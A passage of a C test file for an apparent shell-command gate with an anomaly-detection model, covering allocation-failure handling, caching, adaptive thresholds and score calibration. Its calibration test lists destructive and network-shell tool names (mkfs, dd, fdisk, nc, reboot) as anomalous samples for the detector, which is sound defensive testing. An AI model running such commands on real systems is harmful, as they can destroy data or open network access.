    ASSERT(sg_gate_load_anomaly_model(target, path) == SG_ERR_MEMORY);
    sg_test_alloc_reset();
    ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(target), preserved_vocab);
    sg_gate_free(target);
  }
  sg_gate_free(source);
}

TEST(anomaly_allocation_failure_matrix) {
  sg_result_t result;
  sg_gate_t *probe = sg_gate_new();
  ASSERT(probe != NULL);
  sg_test_alloc_reset();
  ASSERT_SG_OK(sg_gate_enable_anomaly(probe, 100.0, NULL));
  size_t enable_allocations = sg_test_alloc_count();
  sg_test_alloc_reset();
  sg_gate_free(probe);
  ASSERT(enable_allocations >= 2);

  for (size_t i = 1; i <= enable_allocations; i++) {
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    sg_test_alloc_fail_at(i);
    sg_error_t error = sg_gate_enable_anomaly(gate, 100.0, NULL);
    sg_test_alloc_reset();
    ASSERT(error == SG_ERR_MEMORY);
    ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), 0);
    sg_gate_free(gate);
  }

  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));
  ASSERT_SG_OK(eval_cmd(gate, "gcc ; make ; test", &result));
  size_t preserved_vocab = sg_gate_anomaly_vocab_size(gate);
  sg_test_alloc_fail_at(1);
  ASSERT(sg_gate_enable_anomaly(gate, 5.0, NULL) == SG_ERR_MEMORY);
  sg_test_alloc_reset();
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), preserved_vocab);
  ASSERT_SG_OK(sg_gate_set_anomaly_cache_size(gate, 4));
  ASSERT_SG_OK(eval_cmd(gate, "ls ; cd /tmp ; pwd", &result));
  sg_test_alloc_fail_at(1);
  ASSERT(sg_gate_set_anomaly_cache_size(gate, 8) == SG_ERR_MEMORY);
  sg_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(gate, "ls ; cd /tmp ; pwd", &result));

  sg_anomaly_model_t *raw_probe = sg_anomaly_model_new();
  ASSERT(raw_probe != NULL);
  const char raw_sequence[] = "3:gcc,4:make,4:test,";
  sg_test_anomaly_op_reset();
  ASSERT(sg_anomaly_model_update_netseq(raw_probe, raw_sequence,
                                        sizeof(raw_sequence) - 1) ==
         SG_ANOMALY_OK);
  size_t raw_operation_count = sg_test_anomaly_op_count();
  sg_test_anomaly_op_reset();
  sg_anomaly_model_free(raw_probe);
  ASSERT(raw_operation_count > 0);
  /* Raw model consumes exactly raw_operation_count operations; fail the first
   * following operation, which belongs to the type model. */
  sg_test_anomaly_op_fail_at(raw_operation_count + 1);
  ASSERT_SG_OK(eval_cmd(gate, "gcc ; make ; test", &result));
  sg_test_anomaly_op_reset();
  ASSERT(sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(anomaly_calibration_matrix) {
  static const char *normal[] = {
      "ls ; cat file.txt ; pwd",
      "cat file.txt ; grep pattern ; sort",
      "echo hello ; sleep 1 ; true",
      "cp a b ; mv b c ; rm c",
  };
  static const char *anomalies[] = {
      "mkfs ; fdisk ; dd",
      "iptables ; reboot ; shutdown",
      "nc ; strace ; objdump",
      "gdb ; hexdump ; base64",
  };
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);

  sg_result_t result;
  ASSERT(eval_cmd(g, normal[0], &result) == SG_OK);
  double before_training = result.anomaly_score;
  ASSERT(!isnan(before_training));
  for (int i = 0; i < 100; i++)
    ASSERT(eval_cmd(g, normal[i % 4], &result) == SG_OK);

  ASSERT(eval_cmd(g, normal[0], &result) == SG_OK);
  ASSERT(isfinite(result.anomaly_score));
  ASSERT(result.anomaly_score < before_training);

  /* Freeze the model so scoring one case cannot make a later case easier. */
  ASSERT(sg_gate_set_anomaly_update_mode(g, true) == SG_OK);
  double max_normal = -INFINITY;
  double min_anomaly = INFINITY;
  for (size_t i = 0; i < sizeof(normal) / sizeof(normal[0]); i++) {
    ASSERT(eval_cmd(g, normal[i], &result) == SG_OK);
    ASSERT(isfinite(result.anomaly_score));
    if (result.anomaly_score > max_normal)
      max_normal = result.anomaly_score;
    ASSERT(eval_cmd(g, anomalies[i], &result) == SG_OK);
    ASSERT(isfinite(result.anomaly_score));
    if (result.anomaly_score < min_anomaly)
      min_anomaly = result.anomaly_score;
  }
  ASSERT(min_anomaly > max_normal);

  sg_gate_free(g);
}

TEST(anomaly_weight_matrix) {
  static const struct {
    double raw;
    double type;
  } cases[] = {{1.0, 0.0}, {0.0, 1.0}, {0.25, 0.75}};
  static const char *rules[] = {"cat *", "grep *", "grep * *", "sort"};

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
    ASSERT(g != NULL);
    ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
    ASSERT(sg_gate_set_anomaly_weights(g, cases[i].raw, cases[i].type) ==
           SG_OK);
    ASSERT(sg_gate_set_stop_mode(g, SG_EVAL_ALL) == SG_OK);

    sg_result_t result;
    ASSERT(eval_cmd(g, "cat /etc/hosts ; grep root ; sort", &result) == SG_OK);
    ASSERT(isinf(result.anomaly_score));
    ASSERT(!result.anomaly_detected);
    ASSERT(sg_gate_anomaly_vocab_size(g) > 0);
    for (int repetition = 1; repetition < 30; repetition++)
      ASSERT(eval_cmd(g, "cat /etc/hosts ; grep root ; sort", &result) ==
             SG_OK);

    ASSERT(eval_cmd(g, "cat 42 ; grep -E error ; sort", &result) == SG_OK);
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT(isfinite(result.anomaly_score_raw));
    ASSERT(isfinite(result.anomaly_score_type));
    ASSERT(fabs(result.anomaly_score_raw - result.anomaly_score_type) > 1e-6);
    double expected = result.anomaly_score_raw * cases[i].raw +
                      result.anomaly_score_type * cases[i].type;
    ASSERT(fabs(result.anomaly_score - expected) < 1e-12);
    sg_gate_free(g);
  }
}

TEST(anomaly_netseq_score_contract) {
  static const char *training = "cat /etc/hosts ; grep root ; sort";
  static const char *probe = "cat /tmp/x ; grep error ; sort";
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));
  sg_result_t result;
  for (int i = 0; i < 8; i++)
    ASSERT_SG_OK(eval_cmd(gate, training, &result));
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(gate, true));
  ASSERT_SG_OK(eval_cmd(gate, probe, &result));

  char *raw = NULL, *type = NULL;
  size_t raw_count = 0, type_count = 0;
  ASSERT(shell_build_command_netseq(probe, strlen(probe), NULL, &raw,
                                    &raw_count) == SHELL_PROCESS_OK);
  ASSERT(shell_build_type_netseq(probe, strlen(probe), NULL, &type,
                                 &type_count) == SHELL_PROCESS_OK);
  sg_anomaly_sequence_score_t score = {0};
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(gate, raw, strlen(raw), type,
                                            strlen(type), &score));
  ASSERT(score.command_count == raw_count && raw_count == type_count);
  ASSERT(score.raw_score == result.anomaly_score_raw);
  ASSERT(score.type_score == result.anomaly_score_type);
  ASSERT(score.combined_score == result.anomaly_score);
  ASSERT(score.detected == result.anomaly_detected);
  ASSERT(sg_gate_score_anomaly_netseq(gate, raw, strlen(raw), "4:cat,", 6,
                                      &score) == SG_ERR_PARSE);
  ASSERT(sg_gate_score_anomaly_netseq(NULL, raw, strlen(raw), type,
                                      strlen(type), &score) == SG_ERR_INVALID);
  free(raw);
  free(type);
  sg_gate_free(gate);
}

TEST(anomaly_configuration_validation) {
  ASSERT(sg_gate_enable_anomaly(NULL, 5.0, NULL) == SG_ERR_INVALID);
  sg_gate_disable_anomaly(NULL);
  ASSERT(sg_gate_set_anomaly_update_mode(NULL, true) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_skip_on_detected(NULL, true) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_weights(NULL, 0.5, 0.5) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_adaptive(NULL, true, 10) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_k_factor(NULL, 3.0) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_cache_size(NULL, 16) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_combine_mode(NULL, SG_ANOMALY_COMBINE_WEIGHTED) ==
         SG_ERR_INVALID);
  ASSERT(sg_gate_save_anomaly_model(NULL, "/tmp/test") == SG_ERR_INVALID);
  ASSERT(sg_gate_load_anomaly_model(NULL, "/tmp/test") == SG_ERR_INVALID);

  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  static const struct {
    double threshold;
    double alpha;
    double unknown_log_prior;
  } invalid_enable[] = {
      {NAN, 0.1, -10.0},  {INFINITY, 0.1, -10.0}, {5.0, 0.0, -10.0},
      {5.0, -0.1, -10.0}, {5.0, NAN, -10.0},      {5.0, INFINITY, -10.0},
      {5.0, 0.1, NAN},    {5.0, 0.1, -INFINITY},
  };
  for (size_t i = 0; i < sizeof(invalid_enable) / sizeof(invalid_enable[0]);
       i++) {
    sg_anomaly_config_t config = {
        .alpha = invalid_enable[i].alpha,
        .unknown_log_prior = invalid_enable[i].unknown_log_prior,
    };
    ASSERT(sg_gate_enable_anomaly(g, invalid_enable[i].threshold, &config) ==
           SG_ERR_INVALID);
  }

  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
  sg_result_t result;
  ASSERT(eval_cmd(g, "one ; two ; three", &result) == SG_OK);
  size_t preserved_vocab = sg_gate_anomaly_vocab_size(g);
  ASSERT(preserved_vocab == 3);
  sg_anomaly_config_t invalid_config = {
      .alpha = 0.0,
      .unknown_log_prior = -10.0,
  };
  ASSERT(sg_gate_enable_anomaly(g, 5.0, &invalid_config) == SG_ERR_INVALID);
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g), preserved_vocab);

  sg_anomaly_config_t custom_config = {
      .alpha = 0.25,
      .unknown_log_prior = -7.0,
  };
  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, &custom_config));

  ASSERT(sg_gate_set_anomaly_weights(g, -0.1, 1.1) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_weights(g, 0.2, 0.2) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_weights(g, NAN, NAN) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_weights(g, INFINITY, 0.0) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_adaptive(g, true, 0) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_k_factor(g, -1.0) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_k_factor(g, NAN) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_k_factor(g, INFINITY) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_cache_size(g, 8193) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_combine_mode(g, (sg_anomaly_combine_mode_t)99) ==
         SG_ERR_INVALID);
  sg_test_alloc_fail_at(1);
  ASSERT(sg_gate_set_anomaly_adaptive(g, true, 8) == SG_ERR_MEMORY);
  sg_test_alloc_reset();
  for (size_t fail_at = 1; fail_at <= 2; fail_at++) {
    sg_test_alloc_fail_at(fail_at);
    ASSERT(sg_gate_set_anomaly_combine_mode(g, SG_ANOMALY_COMBINE_BAYESIAN) ==
           SG_ERR_MEMORY);
    sg_test_alloc_reset();
  }
  ASSERT(sg_gate_save_anomaly_model(g, NULL) == SG_ERR_INVALID);
  ASSERT(sg_gate_load_anomaly_model(g, NULL) == SG_ERR_INVALID);
  sg_gate_free(g);
}

TEST(anomaly_adaptive_threshold_transitions) {
  static const char *normal = "ls ; cat /etc/hosts ; pwd";
  static const char *novel = "gcc ; make ; strip";
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
  ASSERT(sg_gate_set_anomaly_update_mode(g, true) == SG_OK);
  ASSERT(sg_gate_set_stop_mode(g, SG_EVAL_ALL) == SG_OK);
  ASSERT(sg_gate_add_allow_cpl(g, "ls") == SG_OK);
  ASSERT(sg_gate_add_allow_cpl(g, "cat *") == SG_OK);
  ASSERT(sg_gate_add_allow_cpl(g, "pwd") == SG_OK);

  sg_result_t result;
  for (int i = 0; i < 20; i++) {
    ASSERT(eval_cmd(g, normal, &result) == SG_OK);
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
  }

  ASSERT(sg_gate_set_anomaly_adaptive(g, true, 3) == SG_OK);
  ASSERT(sg_gate_set_anomaly_k_factor(g, 0.0) == SG_OK);

  /* Until three finite samples arm the window, the fixed threshold applies. */
  for (int i = 0; i < 3; i++) {
    ASSERT(eval_cmd(g, normal, &result) == SG_OK);
    ASSERT(isfinite(result.anomaly_score));
    ASSERT(!result.anomaly_detected);
  }

  ASSERT(eval_cmd(g, novel, &result) == SG_OK);
  ASSERT(isfinite(result.anomaly_score));
  ASSERT(result.anomaly_detected);
  double adaptive_score = result.anomaly_score;

  /* Disabling adaptive restores the original fixed threshold. The detected
   * command was not learned, so its score itself remains unchanged. */
  ASSERT(sg_gate_set_anomaly_adaptive(g, false, 0) == SG_OK);
  ASSERT(eval_cmd(g, novel, &result) == SG_OK);
  ASSERT(result.anomaly_score == adaptive_score);
  ASSERT(!result.anomaly_detected);

  /* Reconfiguration resets the window; enough normal samples exercise both
   * re-arming and repeated circular-buffer wraparound. */
  ASSERT(sg_gate_set_anomaly_adaptive(g, true, 3) == SG_OK);
  ASSERT(sg_gate_set_anomaly_k_factor(g, 2.0) == SG_OK);
  for (int i = 0; i < 12; i++) {
    ASSERT(eval_cmd(g, normal, &result) == SG_OK);
    ASSERT(isfinite(result.anomaly_score));
    ASSERT(!isnan(result.anomaly_score));
  }

  /* Disable/re-enable preserves the configured three-sample adaptive window
   * and k-factor while starting with fresh model observations. */
  ASSERT(sg_gate_set_anomaly_k_factor(g, 0.0) == SG_OK);
  sg_gate_disable_anomaly(g);
  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
  for (int i = 0; i < 8; i++)
    ASSERT(eval_cmd(g, normal, &result) == SG_OK);
  ASSERT(eval_cmd(g, novel, &result) == SG_OK);
  ASSERT(result.anomaly_detected);
  sg_gate_free(g);
}

TEST(anomaly_cache_equivalence_matrix) {
  static const struct {
    size_t cache_size;
    const char *command;
  } steps[] = {
      {4, "ls ; cd /tmp ; pwd"},
      {(size_t)-1, "ls ; cd /tmp ; pwd"}, /* hit */
      {(size_t)-1, "cat /etc/hosts ; grep root ; sort"},
      {(size_t)-1, "echo hello ; sleep 1 ; true"},
      {(size_t)-1, "mkdir dir ; chmod 755 dir ; ls dir"},
      {(size_t)-1, "cat /etc/hosts ; grep root ; sort"}, /* promote */
      {(size_t)-1, "cp a b ; mv b c ; rm c"},            /* evict */
      {(size_t)-1, "ls ; cd /tmp ; pwd"},                /* miss */
      {0, "ls ; cd /tmp ; pwd"},                         /* disable */
      {1, "echo hello ; sleep 1 ; true"},                /* resize */
      {(size_t)-1, "echo hello ; sleep 1 ; true"},       /* hit */
      {32, "cp a b ; mv b c ; rm c"},                    /* re-enable */
      {(size_t)-1, "cp a b ; mv b c ; rm c"},            /* hit */
  };

  sg_gate_t *cached = sg_gate_new();
  sg_gate_t *control = sg_gate_new();
  ASSERT(cached != NULL && control != NULL);
  ASSERT(sg_gate_enable_anomaly(cached, 100.0, NULL) == SG_OK);
  ASSERT(sg_gate_enable_anomaly(control, 100.0, NULL) == SG_OK);

  for (size_t i = 0; i < sizeof(steps) / sizeof(steps[0]); i++) {
    if (steps[i].cache_size != (size_t)-1)
      ASSERT(sg_gate_set_anomaly_cache_size(cached, steps[i].cache_size) ==
             SG_OK);

    sg_result_t actual, expected;
    ASSERT(eval_cmd(cached, steps[i].command, &actual) == SG_OK);
    ASSERT(eval_cmd(control, steps[i].command, &expected) == SG_OK);
    ASSERT(actual.verdict == expected.verdict);
    ASSERT(actual.anomaly_detected == expected.anomaly_detected);
    ASSERT(actual.anomaly_score == expected.anomaly_score);
    ASSERT(actual.anomaly_score_raw == expected.anomaly_score_raw);
    ASSERT(actual.anomaly_score_type == expected.anomaly_score_type);
    ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(cached),
                   sg_gate_anomaly_vocab_size(control));
  }

  ASSERT(sg_gate_anomaly_vocab_size(cached) > 0);
  sg_gate_free(cached);
  sg_gate_free(control);
}

static sg_gate_t *anomaly_gate_with_cache(size_t capacity) {
  sg_gate_t *gate = sg_gate_new();
  if (!gate)
    return NULL;
  if (sg_gate_enable_anomaly(gate, 100.0, NULL) != SG_OK ||
      sg_gate_set_anomaly_cache_size(gate, capacity) != SG_OK) {
    sg_gate_free(gate);
    return NULL;
  }
  return gate;
}

static void assert_anomaly_results_equal(const sg_result_t *actual,
                                         const sg_result_t *expected) {
  ASSERT(actual->verdict == expected->verdict);
  ASSERT(actual->anomaly_detected == expected->anomaly_detected);
  ASSERT(actual->anomaly_score == expected->anomaly_score);
  ASSERT(actual->anomaly_score_raw == expected->anomaly_score_raw);
  ASSERT(actual->anomaly_score_type == expected->anomaly_score_type);
}

TEST(anomaly_cache_allocation_failure_matrix) {
  static const struct {
    const char *name;
    const char *warm;
    const char *target;
    size_t expected_allocations;
  } cases[] = {
      {"cache hit", "ls ; pwd ; true", "ls ; pwd ; true", 0},
      {"cold miss", NULL, "cat a ; grep b ; sort", 1},
      {"evicting miss", "ls ; pwd ; true", "cat a ; grep b ; sort", 1},
  };

  for (size_t ci = 0; ci < sizeof(cases) / sizeof(cases[0]); ci++) {
    sg_gate_t *probe = anomaly_gate_with_cache(1);
    ASSERT(probe != NULL);
    sg_result_t ignored;
    if (cases[ci].warm)
      ASSERT_SG_OK(eval_cmd(probe, cases[ci].warm, &ignored));
    sg_test_alloc_reset();
    ASSERT_SG_OK(eval_cmd(probe, cases[ci].target, &ignored));
    size_t allocations = sg_test_alloc_count();
    sg_test_alloc_reset();
    if (allocations != cases[ci].expected_allocations) {
      fprintf(stderr, "%s: got %zu cache allocations, expected %zu\n",
              cases[ci].name, allocations, cases[ci].expected_allocations);
      fail_count++;
    }
    sg_gate_free(probe);

    for (size_t fail_at = 1; fail_at <= allocations; fail_at++) {
      sg_gate_t *actual_gate = anomaly_gate_with_cache(1);
      sg_gate_t *control_gate = anomaly_gate_with_cache(1);
      ASSERT(actual_gate != NULL && control_gate != NULL);
      sg_result_t actual, expected;
      if (cases[ci].warm) {
        ASSERT_SG_OK(eval_cmd(actual_gate, cases[ci].warm, &actual));
        ASSERT_SG_OK(eval_cmd(control_gate, cases[ci].warm, &expected));
        assert_anomaly_results_equal(&actual, &expected);
      }

      sg_test_alloc_fail_at(fail_at);
      ASSERT_SG_OK(eval_cmd(actual_gate, cases[ci].target, &actual));
      sg_test_alloc_reset();
      ASSERT_SG_OK(eval_cmd(control_gate, cases[ci].target, &expected));
      assert_anomaly_results_equal(&actual, &expected);

      /* A failed optimization must not damage the cache or alter the next
       * evaluation after allocation recovers. */
      ASSERT_SG_OK(eval_cmd(actual_gate, cases[ci].target, &actual));
      ASSERT_SG_OK(eval_cmd(control_gate, cases[ci].target, &expected));
      assert_anomaly_results_equal(&actual, &expected);
      sg_gate_free(actual_gate);
      sg_gate_free(control_gate);
    }
  }
}

TEST(anomaly_type_netseq_allocation_failure) {
  static const char *command = "cat a ; grep b ; sort";
  sg_gate_t *probe = anomaly_gate_with_cache(1);
  ASSERT(probe != NULL);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(probe, command, &result));

  /* Force the cache-copy optimization to fall back to the authoritative type
   * builder, then measure its Shellsplit allocations. */
  sg_test_alloc_fail_at(1);
  shellsplit_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(probe, command, &result));
  size_t builder_allocations = shellsplit_test_alloc_count();
  sg_test_alloc_reset();
  shellsplit_test_alloc_reset();
  ASSERT(builder_allocations > 0);
  sg_gate_free(probe);

  for (size_t fail_at = 1; fail_at <= builder_allocations; fail_at++) {
    sg_gate_t *gate = anomaly_gate_with_cache(1);
    ASSERT(gate != NULL);
    ASSERT_SG_OK(eval_cmd(gate, command, &result));
    sg_test_alloc_fail_at(1);
    shellsplit_test_alloc_fail_at(fail_at);
    sg_error_t error = eval_cmd(gate, command, &result);
    sg_test_alloc_reset();
    shellsplit_test_alloc_reset();
    ASSERT(error == SG_ERR_MEMORY);
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
    sg_gate_free(gate);
  }
}

TEST(anomaly_update_reuses_scored_netseq) {
  static const char *command = "cat a ; grep b ; sort";
  char *sequence = NULL;
  size_t count = 0;
  shellsplit_test_alloc_reset();
  ASSERT(shell_build_command_netseq(command, strlen(command), NULL, &sequence,
                                    &count) == SHELL_PROCESS_OK);
  size_t one_build_allocations = shellsplit_test_alloc_count();
  shellsplit_test_alloc_reset();
  ASSERT(sequence != NULL && count == 3 && one_build_allocations > 0);
  free(sequence);

  sg_gate_t *gate = anomaly_gate_with_cache(1);
  ASSERT(gate != NULL);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, command, &result));

  shellsplit_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(shellsplit_test_alloc_count() == one_build_allocations);
  shellsplit_test_alloc_reset();
  sg_gate_free(gate);
}

TEST(anomaly_cache_model_transition_matrix) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = anomaly_gate_with_cache(0);
  ASSERT(source != NULL);
  sg_result_t result;
  static const char *training[] = {
      "ls ; cat file ; pwd", "cat file ; grep x ; sort",
      "echo hello ; sleep 1 ; true", "cp a b ; mv b c ; rm c"};
  for (size_t i = 0; i < 64; i++)
    ASSERT_SG_OK(eval_cmd(source, training[i % 4], &result));
  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));

  sg_gate_t *cached = anomaly_gate_with_cache(2);
  sg_gate_t *control = anomaly_gate_with_cache(0);
  ASSERT(cached != NULL && control != NULL);
  ASSERT_SG_OK(sg_gate_load_anomaly_model(cached, path));
  ASSERT_SG_OK(sg_gate_load_anomaly_model(control, path));
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(cached, true));
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(control, true));
  ASSERT_SG_OK(sg_gate_set_anomaly_adaptive(cached, true, 3));
  ASSERT_SG_OK(sg_gate_set_anomaly_adaptive(control, true, 3));
  ASSERT_SG_OK(sg_gate_set_anomaly_k_factor(cached, 1.5));
  ASSERT_SG_OK(sg_gate_set_anomaly_k_factor(control, 1.5));

  static const struct {
    size_t cache_size;
    const char *command;
    size_t fail_at;
  } transitions[] = {
      {(size_t)-1, "ls ; cat file ; pwd", 0},
      {(size_t)-1, "ls ; cat file ; pwd", 1}, /* hit-copy failure */
      {1, "cat file ; grep x ; sort", 0},     /* resize and miss */
      {(size_t)-1, "gcc ; make ; strip", 2},  /* insertion failure */
      {0, "echo hello ; sleep 1 ; true", 0},  /* disable */
      {4, "cp a b ; mv b c ; rm c", 0},       /* re-enable */
      {(size_t)-1, "cp a b ; mv b c ; rm c", 0},
  };
  for (size_t i = 0; i < sizeof(transitions) / sizeof(transitions[0]); i++) {
    if (transitions[i].cache_size != (size_t)-1)
      ASSERT_SG_OK(
          sg_gate_set_anomaly_cache_size(cached, transitions[i].cache_size));
    sg_result_t actual, expected;
    if (transitions[i].fail_at)
      sg_test_alloc_fail_at(transitions[i].fail_at);
    ASSERT_SG_OK(eval_cmd(cached, transitions[i].command, &actual));
    sg_test_alloc_reset();
    ASSERT_SG_OK(eval_cmd(control, transitions[i].command, &expected));
    assert_anomaly_results_equal(&actual, &expected);
    ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(cached),
                   sg_gate_anomaly_vocab_size(control));
  }

  char truncated[1024] = {0};
  size_t used = 0;
  for (size_t i = 0; i < 70; i++)
    used += (size_t)snprintf(truncated + used, sizeof(truncated) - used,
                             i == 0 ? "x" : " ; x");
  char actual_buffer[8192], expected_buffer[8192];
  sg_result_t actual, expected;
  sg_error_t actual_error =
      sg_gate_evaluate(cached, truncated, strlen(truncated), actual_buffer,
                       sizeof(actual_buffer), &actual);
  sg_error_t expected_error =
      sg_gate_evaluate(control, truncated, strlen(truncated), expected_buffer,
                       sizeof(expected_buffer), &expected);
  ASSERT(actual_error == SG_ERR_TRUNC && expected_error == SG_ERR_TRUNC);
  ASSERT(actual.truncated && expected.truncated);
  ASSERT(actual.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(expected.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(cached),
                 sg_gate_anomaly_vocab_size(control));

  sg_gate_free(control);
  sg_gate_free(cached);
  sg_gate_free(source);
}

/* --- SEPARATE SCORE TESTS --- */

TEST(anomaly_short_type_sequence_stays_finite) {
  /* The type sequence is produced by a different parser than the command
   * sequence, so it can hold fewer than 3 tokens while the command sequence
   * holds 3 or more. The type model cannot score that, and letting its
   * INFINITY through would poison the combined score and silently suppress
   * detection. */
  sg_gate_t *g = sg_gate_new();
  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, NULL));

  sg_result_t r;
  ASSERT_SG_OK(eval_cmd(g, "ls ; cd /tmp ; pwd", &r));
  ASSERT_SG_OK(eval_cmd(g, "& && & && p", &r));
  ASSERT(isfinite(r.anomaly_score));
  ASSERT(isfinite(r.anomaly_score_raw));
  ASSERT(isfinite(r.anomaly_score_type));
  ASSERT(r.anomaly_score_type == 0.0);

  sg_gate_free(g);
}

TEST(truncated_parse_without_subcommands_is_undetermined) {
  /* A command that exhausts the bounded graph-token budget without producing
   * a CMD node (`cd` is modeled as a CWD side effect by default) must not be
   * mistaken for a successfully evaluated empty command list. */
  char cmd[2048] = "cd";
  size_t used = 2;
  for (size_t i = 0; i < 400; i++) {
    ASSERT(used + 2 < sizeof(cmd));
    cmd[used++] = ' ';
    cmd[used++] = 'x';
  }
  cmd[used] = '\0';
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);

  char buf[8192];
  sg_result_t r;
  sg_error_t err = sg_gate_evaluate(g, cmd, strlen(cmd), buf, sizeof(buf), &r);
  ASSERT_EQ_UINT(r.subcommand_count, 0);
  ASSERT(r.truncated);
  ASSERT_EQ_INT(err, SG_ERR_TRUNC);
  ASSERT_EQ_INT(r.verdict, SG_VERDICT_UNDETERMINED);

  sg_gate_free(g);
}

/* --- BAYESIAN COMBINATION TESTS --- */

TEST(bayesian_combination_transitions) {
  static const char *normal[] = {
      "ls ; cat file.txt ; pwd",
      "cat file.txt ; grep pattern ; sort",
      "echo hello ; sleep 1 ; true",
      "cp a b ; mv b c ; rm c",
  };
  static const char *unseen = "gcc ; make ; strip";
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);

  sg_result_t result;
  for (int i = 0; i < 100; i++)
    ASSERT(eval_cmd(g, normal[i % 4], &result) == SG_OK);

  /* Freeze the trained model so only the empirical CDF changes below. */
  ASSERT(sg_gate_set_anomaly_update_mode(g, true) == SG_OK);
  ASSERT(sg_gate_set_anomaly_combine_mode(g, SG_ANOMALY_COMBINE_BAYESIAN) ==
         SG_OK);
  ASSERT(eval_cmd(g, "ls", &result) == SG_OK);
  ASSERT(result.anomaly_score == 0.0);
  ASSERT(!result.anomaly_detected);

  /* The first 128 full sequences use weighted fallback while populating the
   * default-size empirical distributions. */
  for (int i = 0; i < 128; i++) {
    ASSERT(eval_cmd(g, normal[i % 4], &result) == SG_OK);
    double weighted =
        result.anomaly_score_raw * 0.5 + result.anomaly_score_type * 0.5;
    ASSERT(fabs(result.anomaly_score - weighted) < 1e-12);
  }

  ASSERT(eval_cmd(g, normal[0], &result) == SG_OK);
  double normal_bayesian = result.anomaly_score;
  ASSERT(eval_cmd(g, unseen, &result) == SG_OK);
  double unseen_bayesian = result.anomaly_score;
  ASSERT(result.anomaly_score_raw > 0.0);
  ASSERT(unseen_bayesian > normal_bayesian);

  ASSERT(sg_gate_set_anomaly_combine_mode(g, SG_ANOMALY_COMBINE_WEIGHTED) ==
         SG_OK);
  ASSERT(eval_cmd(g, unseen, &result) == SG_OK);
  double weighted =
      result.anomaly_score_raw * 0.5 + result.anomaly_score_type * 0.5;
  ASSERT(fabs(result.anomaly_score - weighted) < 1e-12);
  ASSERT(result.anomaly_score != unseen_bayesian);
  sg_gate_free(g);
}

/* --- MAIN --- */

int main(void) {
  atexit(cleanup_temp_files);
  printf("shellgate tests\n\n");

  printf("Lifecycle:\n");
  RUN(gate_api_contract_matrix);
  RUN(setter_matrix);

  printf("\nBasic evaluation:\n");
  RUN(basic_evaluation_matrix);
  RUN(composition_verdict_matrix);
  RUN(composition_metadata_matrix);
  RUN(compound_group_execution_context_contract);
  RUN(posix_brace_group_pipeline);
  RUN(posix_brace_group_sibling_pipeline_policy_contract);
  RUN(posix_brace_group_policy_and_anomaly_contract);
  RUN(posix_brace_group_document_policy_contract);
  RUN(posix_brace_group_descriptor_document_policy_contract);
  RUN(posix_brace_group_crlf_document_policy_contract);
  RUN(posix_brace_group_multiple_document_policy_contract);
  RUN(posix_brace_group_document_pipeline_policy_contract);
  RUN(brace_group_redirect_and_operator_metadata_contract);
  RUN(nested_brace_group_canonical_policy_contract);
  RUN(brace_group_maximum_depth_contract);
  RUN(strict_heredoc_completion_contract);
